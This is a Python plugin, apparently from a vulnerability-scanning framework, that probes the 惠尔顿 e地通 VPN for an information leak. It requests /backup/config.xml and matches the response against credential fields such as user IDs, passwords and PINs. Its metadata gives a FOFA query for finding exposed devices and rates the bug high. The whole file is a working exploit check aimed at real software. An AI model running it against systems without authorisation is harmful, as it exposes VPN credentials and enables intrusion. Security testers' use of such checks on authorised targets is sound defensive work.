#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/l1SIqHU6bWFSjBsOVex_EA',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '惠尔顿 e地通 信息泄漏',

      'level'     :   'high',

      'FOFA'      :   'fofa：app="惠尔顿-e地通VPN"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/backup/config.xml'
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'config.*?virtualadapter.*?usr.*?id.*?pswd.*?authenticator.*?userpin.*?keypswd.*?',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret